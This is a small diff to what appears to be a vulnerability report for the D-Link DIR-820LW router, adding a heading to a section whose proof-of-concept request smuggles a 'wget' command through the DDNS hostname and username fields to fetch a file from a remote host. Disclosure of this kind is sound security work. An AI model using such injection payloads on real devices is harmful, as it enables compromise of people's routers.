@@ -26,6 +26,7 @@ DIR-820LW (Rev A)
 #### Firmware_link
 
 https://tsd.dlink.com.tw/
+## Vulnerability1
 
 #### Detail
 
@@ -60,3 +61,4 @@ Cookie: hasLogin=1
 
 ccp_act=doCheck&ddnsHostName=;wget${IFS}http://192.168.0.100:9988/doudou.txt;&ddnsUsername=;wget${IFS}http://192.168.0.100:9988/doudou.txt;&ddnsPassword=123123123
 ```
+
